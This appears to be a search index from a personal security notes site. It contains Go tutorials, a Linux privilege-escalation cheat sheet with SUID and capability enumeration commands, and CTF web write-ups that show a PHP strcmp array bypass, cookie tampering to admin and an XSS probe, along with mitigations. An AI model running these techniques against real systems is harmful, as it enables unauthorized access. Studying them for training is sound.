{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"","title":"Home"},{"location":"Ctf/","text":"Writeups KNIGHT CTF 2022 MHSCTF 2022 THM EASY - Wgel CTF THM EASY - Basic Pentesting HTB - Pandora HTB - Late Urchinsec 2022","title":"Writeups"},{"location":"Ctf/#writeups","text":"KNIGHT CTF 2022 MHSCTF 2022 THM EASY - Wgel CTF THM EASY - Basic Pentesting HTB - Pandora HTB - Late Urchinsec 2022","title":"Writeups"},{"location":"Go/","text":"golang IMPORTANT \"package main\" is a must, tells the Go compiler that the package should compile as an executable program instead of a shared library The \"main()\" function is a must, when the program is executed, it is the entry point. All variables, constants, arrays, slices, maps etc.. and their datatypes must be declared before usage Print to output package main import \"fmt\" // 1st method func main() { fmt.Println(\"Hello world\") //this is a comment fmt.Printf(\"Hello world\") } // 2nd method func main() { x := \"Hello world\" fmt.Printf(\"%s\", x) } Declare variables package main import \"fmt\" func main(){ // 1st method var x string = \"Hello World\" var y int = 156 fmt.Println(x) fmt.Println(y) // 2nd method var x string x = \"Hello World\" var y int y = 1 fmt.Println(x) fmt.Println(y) // 3rd method x := \"Hello World\" y := 5 fmt.Println(x) fmt.Println(y) //4th method var ( a = 5 b = \"Hello World\" ) } Set Constants package main import \"fmt\" func main() { const x = \"Hello World\" const y = 5 fmt.Println(x) fmt.Println(y) } Functions // To create a function you use \"func\" followed by the function name i.e func hello(){ } Function with no arguments package main import fmt func hello_function(){ fmt.Println(\"Hello World\") } func main(){ hello_function() } Function with arguments package main import \"fmt\" func say_hello(p string) { fmt.Println(p) } func main(){ say_hello(\"Hello World\") } Function with multiple arguments package main import \"fmt\" func say_hello_and_print_number(p string, x int){ fmt.Println(p) fmt.Println(x) } func main() { say_hello_and_print_number(\"Hello World\", 15) } Functions with arbitrary number of arguments/Variadic functions package main import \"fmt\" func arb_args(nums ...int){ fmt.Print(nums, \" \") } func main() { arb_args(1, 2) arb.args(1, 56, 78, 90) } Loops Technically golang has only one loop - the \"for\" loop that can also act as a while loop. package main import \"fmt\" // 1st method func main() { x := 0 for x<= 100 { fmt.Println(x) x++ } } // 2nd method func main() { for i := 0; i<=100 ; i++ { fmt.Println(i) } } If statements package main import \"fmt\" func main(){ x := 1 //if if x == 1{ fmt.Println(\"X is equal to 1\") } //if else if x == 1 { fmt.Println(\"X is equal to 1\") } else { fmt.Println(\"X is not equal to 1\") } // else if if x == 1 { fmt.Println(\"X is equal to 1\") } else if x != 1 { fmt.Println(\"X is not equal to one\") } else { fmt.Println(\"I don't know waht X is equal to\") } } Switch ..Case package main import \"fmt\" func main() { x := 1 switch x { case 0: fmt.Println(\"x is 0\") case 1: fmt.Println(\"x is 1\") case 2: fmt.Println(\"x is 2\") default: fmt.Println(\"X is a number :)\") } } Read / Write files package main import ( \"fmt\" \"os\" ) func main() { // WRITE TO FILE file, err := os.Create(\"Filename\") if err == nil { _, err := file.WriteString(\"What to write\") **add contents to the file** if err != nil { fmt.Println(\"Failed to write to file\") } } // READ FROM FILE data, err := os.ReadFile(\"Filename\") if err == nil { fmt.Println(string(data)) } }","title":"Go"},{"location":"Go/#golang","text":"","title":"golang"},{"location":"Go/#important","text":"\"package main\" is a must, tells the Go compiler that the package should compile as an executable program instead of a shared library The \"main()\" function is a must, when the program is executed, it is the entry point. All variables, constants, arrays, slices, maps etc.. and their datatypes must be declared before usage","title":"IMPORTANT"},{"location":"Go/#print-to-output","text":"package main import \"fmt\" // 1st method func main() { fmt.Println(\"Hello world\") //this is a comment fmt.Printf(\"Hello world\") } // 2nd method func main() { x := \"Hello world\" fmt.Printf(\"%s\", x) }","title":"Print to output"},{"location":"Go/#declare-variables","text":"package main import \"fmt\" func main(){ // 1st method var x string = \"Hello World\" var y int = 156 fmt.Println(x) fmt.Println(y) // 2nd method var x string x = \"Hello World\" var y int y = 1 fmt.Println(x) fmt.Println(y) // 3rd method x := \"Hello World\" y := 5 fmt.Println(x) fmt.Println(y) //4th method var ( a = 5 b = \"Hello World\" ) }","title":"Declare variables"},{"location":"Go/#set-constants","text":"package main import \"fmt\" func main() { const x = \"Hello World\" const y = 5 fmt.Println(x) fmt.Println(y) }","title":"Set Constants"},{"location":"Go/#functions","text":"// To create a function you use \"func\" followed by the function name i.e func hello(){ }","title":"Functions"},{"location":"Go/#function-with-no-arguments","text":"package main import fmt func hello_function(){ fmt.Println(\"Hello World\") } func main(){ hello_function() }","title":"Function with no arguments"},{"location":"Go/#function-with-arguments","text":"package main import \"fmt\" func say_hello(p string) { fmt.Println(p) } func main(){ say_hello(\"Hello World\") }","title":"Function with arguments"},{"location":"Go/#function-with-multiple-arguments","text":"package main import \"fmt\" func say_hello_and_print_number(p string, x int){ fmt.Println(p) fmt.Println(x) } func main() { say_hello_and_print_number(\"Hello World\", 15) }","title":"Function with multiple arguments"},{"location":"Go/#functions-with-arbitrary-number-of-argumentsvariadic-functions","text":"package main import \"fmt\" func arb_args(nums ...int){ fmt.Print(nums, \" \") } func main() { arb_args(1, 2) arb.args(1, 56, 78, 90) }","title":"Functions with arbitrary number of arguments/Variadic functions"},{"location":"Go/#loops","text":"Technically golang has only one loop - the \"for\" loop that can also act as a while loop. package main import \"fmt\" // 1st method func main() { x := 0 for x<= 100 { fmt.Println(x) x++ } } // 2nd method func main() { for i := 0; i<=100 ; i++ { fmt.Println(i) } }","title":"Loops"},{"location":"Go/#if-statements","text":"package main import \"fmt\" func main(){ x := 1 //if if x == 1{ fmt.Println(\"X is equal to 1\") } //if else if x == 1 { fmt.Println(\"X is equal to 1\") } else { fmt.Println(\"X is not equal to 1\") } // else if if x == 1 { fmt.Println(\"X is equal to 1\") } else if x != 1 { fmt.Println(\"X is not equal to one\") } else { fmt.Println(\"I don't know waht X is equal to\") } }","title":"If statements"},{"location":"Go/#switch-case","text":"package main import \"fmt\" func main() { x := 1 switch x { case 0: fmt.Println(\"x is 0\") case 1: fmt.Println(\"x is 1\") case 2: fmt.Println(\"x is 2\") default: fmt.Println(\"X is a number :)\") } }","title":"Switch ..Case"},{"location":"Go/#read-write-files","text":"package main import ( \"fmt\" \"os\" ) func main() { // WRITE TO FILE file, err := os.Create(\"Filename\") if err == nil { _, err := file.WriteString(\"What to write\") **add contents to the file** if err != nil { fmt.Println(\"Failed to write to file\") } } // READ FROM FILE data, err := os.ReadFile(\"Filename\") if err == nil { fmt.Println(string(data)) } }","title":"Read / Write files"},{"location":"Privesc/","text":"Sudo -l Might require a password Suid & Sgid find / -perm /4000 - suid find / -perm /2000 - sgid bit set find / -perm /6000 - both suid and sgid Capabilities getcap - get capabilities e.g getcap -r / 2>/dev/null setcap - set capabilities e.g setcap \"Capabilites to set\" /path/to/file To see all linux capabilities use man 7 capabilities World-Writable Files find / -type f -perm /0777 2>/dev/null find / -type d -perm /0777 2>/dev/null find / -xdev -user root -perm -a+w -name hello /etc /etc/crontab /etc/cron.d /etc/doas.conf /etc/exports /etc/apache2/sites-enabled/000-default.conf /etc/apache2/.htpasswd NFS Shares The Network File System (NFS) is a mechanism for storing files on a network. It is a distributed file system that allows users to access files and directories located on remote computers and treat those files and directories as if they were local. By default, NFS shares change the root user to the nfsnobody user, an unprivileged user account. In this way, all root-created files are owned by nfsnobody, which prevents uploading of programs with the setuid bit set. no_root_squash Allows root users on client computers to have root access on the server. Mount requests for root are not be mounted to the anonomous user. This option is needed for diskless clients. This is a good privesc vector if vuln is found. root_squash Requests from root clients are mapped to the nobody user and group ID so they will only have file privileges associated with other. ro - read only access rw - read write access","title":"Privesc"},{"location":"Privesc/#sudo-l","text":"Might require a password","title":"Sudo -l"},{"location":"Privesc/#suid-sgid","text":"find / -perm /4000 - suid find / -perm /2000 - sgid bit set find / -perm /6000 - both suid and sgid","title":"Suid &amp; Sgid"},{"location":"Privesc/#capabilities","text":"getcap - get capabilities e.g getcap -r / 2>/dev/null setcap - set capabilities e.g setcap \"Capabilites to set\" /path/to/file To see all linux capabilities use man 7 capabilities","title":"Capabilities"},{"location":"Privesc/#world-writable-files","text":"find / -type f -perm /0777 2>/dev/null find / -type d -perm /0777 2>/dev/null find / -xdev -user root -perm -a+w -name hello","title":"World-Writable Files"},{"location":"Privesc/#etc","text":"/etc/crontab /etc/cron.d /etc/doas.conf /etc/exports /etc/apache2/sites-enabled/000-default.conf /etc/apache2/.htpasswd","title":"/etc"},{"location":"Privesc/#nfs-shares","text":"The Network File System (NFS) is a mechanism for storing files on a network. It is a distributed file system that allows users to access files and directories located on remote computers and treat those files and directories as if they were local. By default, NFS shares change the root user to the nfsnobody user, an unprivileged user account. In this way, all root-created files are owned by nfsnobody, which prevents uploading of programs with the setuid bit set.","title":"NFS Shares"},{"location":"Privesc/#no_root_squash","text":"Allows root users on client computers to have root access on the server. Mount requests for root are not be mounted to the anonomous user. This option is needed for diskless clients. This is a good privesc vector if vuln is found.","title":"no_root_squash"},{"location":"Privesc/#root_squash","text":"Requests from root clients are mapped to the nobody user and group ID so they will only have file privileges associated with other. ro - read only access rw - read write access","title":"root_squash"},{"location":"Programming/Assembly/Commandline/","text":"Commandline Arguments Normally, when we want to pass commandline arguments to a program we call the program followed by the argument(s). To understand what is going on I have written a simple program that will take file name as an argument from the Commandline, read and display it's contents to stdout. I'll debug the program using strace and gdb to understand what's going on behind the scenes The program is called reader and it's assembled as a 32 bit program while the file we are going to read is called flag.txt. Strace and GDB Strace GDB Strace and GDB explained Running the program with strace, execve() is being called with \"./reader\" and [\"./reader\",\"flag.txt\"] as its parameters. Structure of execve() execve is used to execute a program takes three arguments where the first two are our main concern which are pathname and argv[] pathname must be either a binary executable, or a script argv is an array of pointers to strings passed to the new program as its command-line arguments. By convention, the first of these strings (i.e., argv[0]) should contain the filename associated with the file being executed. In the gdb output, I've set the breakpoint at _start where the program instructions are, so no instruction has run yet. Position 1 in the gdb output shows the current position of the stack pointer which is at 0x3 . If you know how the stack works, you know that it grows downwards from a high memory address to a lower memory address. This is evident by position 2 and 3 in the gdb output. Checking the contents of the stack at gdb output 3, the file we are reading is at position 0012 while the stack pointer is at 0000 meaning we have to do stack pointer + 8 (0012-0004)to get the first parameter. From above, it's safe to say that when a program with commandline arguments is executed, execve places the number of arguments, pathname of the program and the program's arguments onto the stack and if we're going to write a 32 bit assembly program with commandline arguments, you have to keep these in mind: stack pointer + 0 = path to program stack pointer + 4 = program being executed stack pointer + 8 = first parameter stack poineter + 12 + _ so on _ = other parameters The reader program source code can be found at reader","title":"Commandline Arguments"},{"location":"Programming/Assembly/Commandline/#commandline-arguments","text":"Normally, when we want to pass commandline arguments to a program we call the program followed by the argument(s). To understand what is going on I have written a simple program that will take file name as an argument from the Commandline, read and display it's contents to stdout. I'll debug the program using strace and gdb to understand what's going on behind the scenes The program is called reader and it's assembled as a 32 bit program while the file we are going to read is called flag.txt.","title":"Commandline Arguments"},{"location":"Programming/Assembly/Commandline/#strace-and-gdb","text":"Strace GDB","title":"Strace and GDB"},{"location":"Programming/Assembly/Commandline/#strace-and-gdb-explained","text":"Running the program with strace, execve() is being called with \"./reader\" and [\"./reader\",\"flag.txt\"] as its parameters. Structure of execve() execve is used to execute a program takes three arguments where the first two are our main concern which are pathname and argv[] pathname must be either a binary executable, or a script argv is an array of pointers to strings passed to the new program as its command-line arguments. By convention, the first of these strings (i.e., argv[0]) should contain the filename associated with the file being executed. In the gdb output, I've set the breakpoint at _start where the program instructions are, so no instruction has run yet. Position 1 in the gdb output shows the current position of the stack pointer which is at 0x3 . If you know how the stack works, you know that it grows downwards from a high memory address to a lower memory address. This is evident by position 2 and 3 in the gdb output. Checking the contents of the stack at gdb output 3, the file we are reading is at position 0012 while the stack pointer is at 0000 meaning we have to do stack pointer + 8 (0012-0004)to get the first parameter. From above, it's safe to say that when a program with commandline arguments is executed, execve places the number of arguments, pathname of the program and the program's arguments onto the stack and if we're going to write a 32 bit assembly program with commandline arguments, you have to keep these in mind: stack pointer + 0 = path to program stack pointer + 4 = program being executed stack pointer + 8 = first parameter stack poineter + 12 + _ so on _ = other parameters The reader program source code can be found at reader","title":"Strace and GDB explained"},{"location":"Writeups/2022-01-22-knight-ctf/","text":"KnightCTF Jan 2022 This is one of the CTFs that start the year and took place on 20th Jan 2022 and ended on 21st Jan 2022. It was a jeorpady style CTF. This was my first international CTF and I belonged to the team: I decided to tackle the web category and was able to do at least three of the eleven challenges which was not impressive(Will do better captain @Winter XD). Hope I will solve more challenges in upcoming events.The challenges required at least some knowledge in PHP and were : Find Pass Code -1. This challenge required a pass code to get the flag. However this was not the case. On interacting with the page, I tried different words and numbers but kept getting the same thing on every occasion. When viewing the source code, this came up. <div class=\"title-text\">Welcome to Pass Code Verification</div><br> <!-- Hi Serafin, I learned something new today. I build this website for you to verify our KnightCTF 2022 pass code. You can view the source code by sending the source param --> <form action=\"\" method=\"POST\"> <label>Pass Code</label> <input class=\"form-control\" type=\"text\" placeholder=\"Enter Pass Code\" name=\"pass_code\"> <input class=\"form-control\" type=\"submit\" value=\"Verify\" /> </form> One of the site\u2019s builders left a note to their partner advising them that to view the original source code they had to send the source parameter. We do exactly that \u2192http://find-pass-code-one.kshackzone.com/?source. This brings us to this which explains why I kept getting the wrong pass code error. The PHP code compares the pass_code we enter to $flag by using strcmp(). SYNTAX: strcmp( $string1, $string2 ) where $string1 and $string2 are the strings to be compared. Return Values: strcmp() returns a random integer value depending on the condition of the match, which is given by: Returns 0 if the strings are equal. Returns a negative value (< 0), if $string2 is greater than $string1. Returns a positive value (> 0) if $string1 is greater than $string2. After a bit of research, it seemed that strcmp() had some issues when comparing a string to something else. In PHP, a variable is considered to be null if:it has been assigned the constant null, it has not been set to any value yet. So NULL == 0 . If we could make strcmp() result be NULL will bypass it. We give post request like this pass_code[]=lol then the $pass_code becomes an array. Now comparing this, instead of throwing an error, it returns NULL and in PHP NULL == 0, which means string comparison passed and we got the flag :)","title":"KNIGHT CTF 2022"},{"location":"Writeups/2022-01-22-knight-ctf/#knightctf-jan-2022","text":"This is one of the CTFs that start the year and took place on 20th Jan 2022 and ended on 21st Jan 2022. It was a jeorpady style CTF. This was my first international CTF and I belonged to the team: I decided to tackle the web category and was able to do at least three of the eleven challenges which was not impressive(Will do better captain @Winter XD). Hope I will solve more challenges in upcoming events.The challenges required at least some knowledge in PHP and were : Find Pass Code -1. This challenge required a pass code to get the flag. However this was not the case. On interacting with the page, I tried different words and numbers but kept getting the same thing on every occasion. When viewing the source code, this came up. <div class=\"title-text\">Welcome to Pass Code Verification</div><br> <!-- Hi Serafin, I learned something new today. I build this website for you to verify our KnightCTF 2022 pass code. You can view the source code by sending the source param --> <form action=\"\" method=\"POST\"> <label>Pass Code</label> <input class=\"form-control\" type=\"text\" placeholder=\"Enter Pass Code\" name=\"pass_code\"> <input class=\"form-control\" type=\"submit\" value=\"Verify\" /> </form> One of the site\u2019s builders left a note to their partner advising them that to view the original source code they had to send the source parameter. We do exactly that \u2192http://find-pass-code-one.kshackzone.com/?source. This brings us to this which explains why I kept getting the wrong pass code error. The PHP code compares the pass_code we enter to $flag by using strcmp(). SYNTAX: strcmp( $string1, $string2 ) where $string1 and $string2 are the strings to be compared. Return Values: strcmp() returns a random integer value depending on the condition of the match, which is given by: Returns 0 if the strings are equal. Returns a negative value (< 0), if $string2 is greater than $string1. Returns a positive value (> 0) if $string1 is greater than $string2. After a bit of research, it seemed that strcmp() had some issues when comparing a string to something else. In PHP, a variable is considered to be null if:it has been assigned the constant null, it has not been set to any value yet. So NULL == 0 . If we could make strcmp() result be NULL will bypass it. We give post request like this pass_code[]=lol then the $pass_code becomes an array. Now comparing this, instead of throwing an error, it returns NULL and in PHP NULL == 0, which means string comparison passed and we got the flag :)","title":"KnightCTF Jan 2022"},{"location":"Writeups/2022-02-26-mhsctf-2022/","text":"MHSCTF 2022 February 18th, 12PM EST - February 25th, 12PM EST Overall, the ctf was easy (in regard to web). The CTF was jeopardy-style and covered: * General/Misc * Cryptography * Forensics * Web Exploits * Reverse Engineering * Pwn As usual I was with my team Fr334aks-mini and Web Exploits. In total there were eight web challenges. I managed to solve four of them while my teammates solved the other four. I will also touch on 1 other that I managed to solve but were solved before i got started. Challenges James Harold Japp - 10 points new site who dis? - 20 points(Solved by teammate) Piece it together - 25 points Cuppa Joe- 30 points Practice for School - 55 points Challenge 1: James Harold Japp - 10 pts. The vulnerability in this challenge is number one in the OWASP top ten vulnerabilities A01:2021-Broken Access Control . You can read more about it in Portswigger's Access control vulnerabilities and privilege escalation . The mission of this challenge was to login to a site and get the flag. We're directed to a login page that looked like this: Page-source: <head> <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"> <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin> <link href=\"https://fonts.googleapis.com/css2?family=Lato:wght@300&family=Exo+2&display=swap\" rel=\"stylesheet\"> <link rel=\"stylesheet\" href=\"https://www.w3schools.com/w3css/4/w3.css\"> <link rel=\"stylesheet\" href=\"https://mhsctf-webexploitdata.0xmmalik.repl.co/style.css\"> </head> <body> <div class=\"w3-content\"> <label for=\"pwd\">Password:</label> <input type=\"password\" id=\"pwd\" name=\"pwd\"> <button onclick=\"validatepwd()\" type=\"button\">Submit</button> <script> function validatepwd() { var x = document.getElementById(\"pwd\").value; if (x == \"this_is_a_really_secure_password\") { window.open(\"/weirdpage.php?pwd=doublepassword\") } } </script> </div> </body> Now we've got the password for the login --> this_is_a_really_secure_password . The script is supposed to open a new url /weirdpage.php?pwd=doublepassword if the password is right.. However on heading to the redirection url.... But what does the source code have to say.... <!doctype html><html><head><!--lol gottem here's the flag: flag{1n$p3ct0r_g3n3r@l}--><title>404 Not Found</title><style> body { background-color: #fcfcfc; color: #333333; margin: 0; padding:0; } h1 { font-size: 1.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0; } h1, p { padding-left: 10px; } code.url { background-color: #eeeeee; font-family:monospace; padding:0 2px;} </style> </head><body><h1>Not Found</h1><p>The requested resource <code class=\"url\">/weirdpage.php?pwd=doublepassword</code> was not found on this server.</p></body></html> Now we've got 10 points on our side. Mitigation Use strong passwords with eight or more characers. The characters should comprise of both small and capital letters, numbers, special char and the password should also be unexpected. Also don't use default creds. Change them once you have the security control measure in. Don't use scripts in the client side to authenticate users. Some obfuscation is good but thats bad. Use a database and PHP. This way your code is more secure. Challenge 2: new site who dis? - 20pts (solved earlier before me). Heading to this challenge we're taken to this site that says.... On clicking the link we're taken to another that says.... Checking the results, we can guess that the flag page is using something to confirm whether I am an admin or not. I check the cookies to see if there is anything and I find one with the name user and has the value basic. I guess this is it. I change the value to admin, reload the page and voila! I get the flag. Mitigation Don't use obvious cookies that show what their use is for. Use session identifiers. These have their own issues, but won't let people break things quite so easily. Challenge 3: Piece It Together - 25pts. What does the DOM selection source have to say... <div class=\"w3-content\"> <h2>Login</h2> <script> var _0xa8fe=[\"\\x34\\x77\",\"\\x64\\x7D\",\"\\x67\\x7B\",\"\\x6A\",\"\\x7D\",\"\\x31\\x67\",\"\\x77\\x30\",\"\\x72\",\"\\x61\\x6C\",\"\\x73\",\"\\x68\\x37\",\"\\x61\\x67\\x7B\",\"\\x66\\x6C\",\"\\x6D\\x33\\x74\",\"\\x76\\x61\\x6C\\x75\\x65\",\"\\x70\\x77\\x64\",\"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\",\"\\x59\\x65\\x70\\x2C\\x20\\x74\\x68\\x61\\x74\\x27\\x73\\x20\\x74\\x68\\x65\\x20\\x66\\x6C\\x61\\x67\\x21\",\"\\x53\\x6F\\x72\\x72\\x79\\x2C\\x20\\x74\\x68\\x61\\x74\\x27\\x73\\x20\\x6E\\x6F\\x74\\x20\\x74\\x68\\x65\\x20\\x66\\x6C\\x61\\x67\\x21\"];function checkpwd(){if(document[_0xa8fe[16]](_0xa8fe[15])[_0xa8fe[14]]== (_0xa8fe[12]+ _0xa8fe[11]+ _0xa8fe[3]+ _0xa8fe[5]+ _0xa8fe[9]+ _0xa8fe[0]+ _0xa8fe[4])){alert(_0xa8fe[17])}else {alert(_0xa8fe[18])}} </script> <label for=\"pwd\">Password:</label> <input type=\"text\" id=\"pwd\" name=\"pwd\"> <button onclick=\"checkpwd()\">Submit</button> </div> ``` The javascript has been obfuscated. My guess is the obfuscated javascript is validating the password. So I head over to [deobfuscate.io](https://deobfuscate.io/) to deobfuscate. ``` function checkpwd() { if (document.getElementById(\"pwd\").value == \"flag{j1gs4w}\") { alert(\"Yep, that's the flag!\"); } else { alert(\"Sorry, that's not the flag!\"); } } The flag is right there... flag{j1gs4w} Mitigation. Don't use client side scripts to authenticate users. Use a database and php. This makes your site more secure. Challenge 4: Cuppa Joe - 3pts. At first on viewing the web page, the firt thing that came on my mind was XSS and true enough inserting and submitting <script>alert(1)</script> in the query gives out However this would be a very deep rabbit hole..so i continue to interact with the page. The flag.php looks inviting but on clicking nothing changes except the url which changes from https://mhsctf-cuppajoe.0xmmalik.repl.co/ to https://mhsctf-cuppajoe.0xmmalik.repl.co/TODO%20fill%20out%20the%20links. So i check the page source code which seals the fate... <head> <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"> <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin> <link href=\"https://fonts.googleapis.com/css2?family=Lato:wght@300&family=Exo+2&display=swap\" rel=\"stylesheet\"> <link rel=\"stylesheet\" href=\"https://www.w3schools.com/w3css/4/w3.css\"> <link rel=\"stylesheet\" href=\"https://mhsctf-webexploitdata.0xmmalik.repl.co/style.css\"> </head> <body> <div class=\"w3-content\"> <h2>Cuppa Joe</h2> <div class=\"sidenav\"> Sitemap: <ul> <li><a href=\"TODO fill out the links\">index.php</a></li> <li><a href=\"TODO fill out the links\">flag.php</a></li> <li><a href=\"TODO fill out the links\">message.php</a></li> </ul> </div> Welcome to Cuppa Joe! We're a coffee shop that... loves coffee! Our website is still under construction so don't be going around and exploiting us ;)<br /><br />Leave us a message in the meantime!<br /><br /> <form action=\"message.php\" method=\"POST\"> <label for=\"message\">Your message:</label><br /> <textarea name=\"message\" id=\"message\" rows=\"5\" cols=\"50\" style=\"height:30%;\"></textarea><br /> <input type=\"submit\"> </form> </div> </body> The href=\"TODO fill out the links\" jumps at me that I'm supposed to fill out the links with their proper reference. Because I'm only interested with the flag I use the browser inspector to change href=\"TODO fill out the links\" to href=\"flag.php\". Clicking the new link I get the flag . Challenge 5: Practice For School - 55pts. This one was tricky. We're provided with a link to an edpuzzle classroom https://edpuzzle.com/assignments/60c90ddeffb96f416707e09d/watch. In the challenge description the author gives a note the video is 168 hours (1 week) long so you will not be able to watch through the whole thing. :) Well we could do that by forwarding the video. Now this is where I started scratching my head (but not for long). The youtube video had no controls and no way to forward it!!! Also the edpuzzle control bar was locked. There is a multiple-choice task that is activated when the video reached a time. I had to find a way to forward the video. The youtube video was an iframe suggesting that it had its own controls. It then occurred to me that the controls were somehow removed when the iframe was being loaded. I had to find a way to intercept the request. Burpsuite. I loaded burpsuite to intercept the iframe request and sure enough I intercepted the rogue request :) So i change controls=0 to controls=1 and now we have a control bar. Then IMPORTANT drag the control all the way to the end to reveal the multiple-choice question and finally the flag. All in all the CTF was awesome and a little challenging. Thanks to the MHSCTF team for the CTF. Looking forward for more CTFs from them. That's all i've got for this CTF. Till next CTF, Parsz.","title":"MHSCTF 2022"},{"location":"Writeups/2022-02-26-mhsctf-2022/#mhsctf-2022","text":"","title":"MHSCTF 2022"},{"location":"Writeups/2022-02-26-mhsctf-2022/#february-18th-12pm-est-february-25th-12pm-est","text":"Overall, the ctf was easy (in regard to web). The CTF was jeopardy-style and covered: * General/Misc * Cryptography * Forensics * Web Exploits * Reverse Engineering * Pwn As usual I was with my team Fr334aks-mini and Web Exploits. In total there were eight web challenges. I managed to solve four of them while my teammates solved the other four. I will also touch on 1 other that I managed to solve but were solved before i got started.","title":"February 18th, 12PM EST - February 25th, 12PM EST"},{"location":"Writeups/2022-02-26-mhsctf-2022/#challenges","text":"James Harold Japp - 10 points new site who dis? - 20 points(Solved by teammate) Piece it together - 25 points Cuppa Joe- 30 points Practice for School - 55 points","title":"Challenges"},{"location":"Writeups/2022-02-26-mhsctf-2022/#challenge-1-james-harold-japp-10-pts","text":"The vulnerability in this challenge is number one in the OWASP top ten vulnerabilities A01:2021-Broken Access Control . You can read more about it in Portswigger's Access control vulnerabilities and privilege escalation . The mission of this challenge was to login to a site and get the flag. We're directed to a login page that looked like this:","title":"Challenge 1: James Harold Japp - 10 pts."},{"location":"Writeups/2022-02-26-mhsctf-2022/#page-source","text":"<head> <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"> <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin> <link href=\"https://fonts.googleapis.com/css2?family=Lato:wght@300&family=Exo+2&display=swap\" rel=\"stylesheet\"> <link rel=\"stylesheet\" href=\"https://www.w3schools.com/w3css/4/w3.css\"> <link rel=\"stylesheet\" href=\"https://mhsctf-webexploitdata.0xmmalik.repl.co/style.css\"> </head> <body> <div class=\"w3-content\"> <label for=\"pwd\">Password:</label> <input type=\"password\" id=\"pwd\" name=\"pwd\"> <button onclick=\"validatepwd()\" type=\"button\">Submit</button> <script> function validatepwd() { var x = document.getElementById(\"pwd\").value; if (x == \"this_is_a_really_secure_password\") { window.open(\"/weirdpage.php?pwd=doublepassword\") } } </script> </div> </body> Now we've got the password for the login --> this_is_a_really_secure_password . The script is supposed to open a new url /weirdpage.php?pwd=doublepassword if the password is right.. However on heading to the redirection url.... But what does the source code have to say.... <!doctype html><html><head><!--lol gottem here's the flag: flag{1n$p3ct0r_g3n3r@l}--><title>404 Not Found</title><style> body { background-color: #fcfcfc; color: #333333; margin: 0; padding:0; } h1 { font-size: 1.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0; } h1, p { padding-left: 10px; } code.url { background-color: #eeeeee; font-family:monospace; padding:0 2px;} </style> </head><body><h1>Not Found</h1><p>The requested resource <code class=\"url\">/weirdpage.php?pwd=doublepassword</code> was not found on this server.</p></body></html> Now we've got 10 points on our side.","title":"Page-source:"},{"location":"Writeups/2022-02-26-mhsctf-2022/#mitigation","text":"Use strong passwords with eight or more characers. The characters should comprise of both small and capital letters, numbers, special char and the password should also be unexpected. Also don't use default creds. Change them once you have the security control measure in. Don't use scripts in the client side to authenticate users. Some obfuscation is good but thats bad. Use a database and PHP. This way your code is more secure.","title":"Mitigation"},{"location":"Writeups/2022-02-26-mhsctf-2022/#challenge-2-new-site-who-dis-20pts-solved-earlier-before-me","text":"Heading to this challenge we're taken to this site that says.... On clicking the link we're taken to another that says.... Checking the results, we can guess that the flag page is using something to confirm whether I am an admin or not. I check the cookies to see if there is anything and I find one with the name user and has the value basic. I guess this is it. I change the value to admin, reload the page and voila! I get the flag.","title":"Challenge 2:  new site who dis? - 20pts (solved earlier before me)."},{"location":"Writeups/2022-02-26-mhsctf-2022/#mitigation_1","text":"Don't use obvious cookies that show what their use is for. Use session identifiers. These have their own issues, but won't let people break things quite so easily.","title":"Mitigation"},{"location":"Writeups/2022-02-26-mhsctf-2022/#challenge-3-piece-it-together-25pts","text":"What does the DOM selection source have to say... <div class=\"w3-content\"> <h2>Login</h2> <script> var _0xa8fe=[\"\\x34\\x77\",\"\\x64\\x7D\",\"\\x67\\x7B\",\"\\x6A\",\"\\x7D\",\"\\x31\\x67\",\"\\x77\\x30\",\"\\x72\",\"\\x61\\x6C\",\"\\x73\",\"\\x68\\x37\",\"\\x61\\x67\\x7B\",\"\\x66\\x6C\",\"\\x6D\\x33\\x74\",\"\\x76\\x61\\x6C\\x75\\x65\",\"\\x70\\x77\\x64\",\"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\",\"\\x59\\x65\\x70\\x2C\\x20\\x74\\x68\\x61\\x74\\x27\\x73\\x20\\x74\\x68\\x65\\x20\\x66\\x6C\\x61\\x67\\x21\",\"\\x53\\x6F\\x72\\x72\\x79\\x2C\\x20\\x74\\x68\\x61\\x74\\x27\\x73\\x20\\x6E\\x6F\\x74\\x20\\x74\\x68\\x65\\x20\\x66\\x6C\\x61\\x67\\x21\"];function checkpwd(){if(document[_0xa8fe[16]](_0xa8fe[15])[_0xa8fe[14]]== (_0xa8fe[12]+ _0xa8fe[11]+ _0xa8fe[3]+ _0xa8fe[5]+ _0xa8fe[9]+ _0xa8fe[0]+ _0xa8fe[4])){alert(_0xa8fe[17])}else {alert(_0xa8fe[18])}} </script> <label for=\"pwd\">Password:</label> <input type=\"text\" id=\"pwd\" name=\"pwd\"> <button onclick=\"checkpwd()\">Submit</button> </div> ``` The javascript has been obfuscated. My guess is the obfuscated javascript is validating the password. So I head over to [deobfuscate.io](https://deobfuscate.io/) to deobfuscate. ``` function checkpwd() { if (document.getElementById(\"pwd\").value == \"flag{j1gs4w}\") { alert(\"Yep, that's the flag!\"); } else { alert(\"Sorry, that's not the flag!\"); } } The flag is right there... flag{j1gs4w}","title":"Challenge 3: Piece It Together - 25pts."},{"location":"Writeups/2022-02-26-mhsctf-2022/#mitigation_2","text":"Don't use client side scripts to authenticate users. Use a database and php. This makes your site more secure.","title":"Mitigation."},{"location":"Writeups/2022-02-26-mhsctf-2022/#challenge-4-cuppa-joe-3pts","text":"At first on viewing the web page, the firt thing that came on my mind was XSS and true enough inserting and submitting <script>alert(1)</script> in the query gives out However this would be a very deep rabbit hole..so i continue to interact with the page. The flag.php looks inviting but on clicking nothing changes except the url which changes from https://mhsctf-cuppajoe.0xmmalik.repl.co/ to 